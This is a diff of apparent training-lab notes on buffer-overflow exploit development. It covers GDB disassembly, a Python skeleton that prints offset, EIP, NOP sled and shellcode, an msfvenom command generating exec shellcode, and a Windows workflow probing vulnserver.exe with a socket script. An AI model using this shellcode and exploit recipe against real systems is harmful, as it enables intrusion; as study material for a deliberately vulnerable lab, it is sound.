@@ -197,7 +197,7 @@ break <address>  #   Establish a break point
 26      # info functions again (more output)
 27 # Dissassembly
 28     # pdisass main  
-29     # pdisass <new function call>
+29     # pdisass <new function call> ----> querying words in GREEN -----> vulnerable function is in RED
 30
 -----------------------------------------------------------------------------------------------------------
 #!/usr/bin/env python
@@ -270,14 +270,32 @@ print(offset + eip + nop + buf)
     #msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
 
 ADD ALL RESULTS TO SCIRPT AND PRINT STATEMENT
-
-
-
-
-
-
-
-
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+###WINDOWS FUNC###
+#Static Analysis
+    strings.exe vulnserver.exe   ------> (Looking for clues and leads)
+    GUI > Properties           -------> (More potential leads)
+#Behavioral Analysis
+    RUN IT
+    netstat -anob
+    get-process | findstr /i <string to look for>
+    nc <win ip> <port identified>  ----> (Ran from Lin-Ops and see what pops up)
+#Dynamic Analysis
+    Run Immunity Debugger > Run vulnserver.exe > File > Attach | Rewind > Play
+    On Lin-Ops CREATE NEW SCRIPT 
+  1 #!/usr/bin/python
+  2 import socket 
+  3 buf = "HELP"
+  4 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  #Creates socket
+  5 s.connect(("10.50.171.24", 9999))   #Connecting to TargetIP/Port  ------> (your windows ip)
+  6 print s.recv(1024)  #Print response
+  7 s.send(buf)  #Sends value of buf
+  8 print s.recv(1024)  #Print response
+  9 s.close()  #Closes the socket
+ 10
+ 11
+ 12
+ 13 
 
 
 
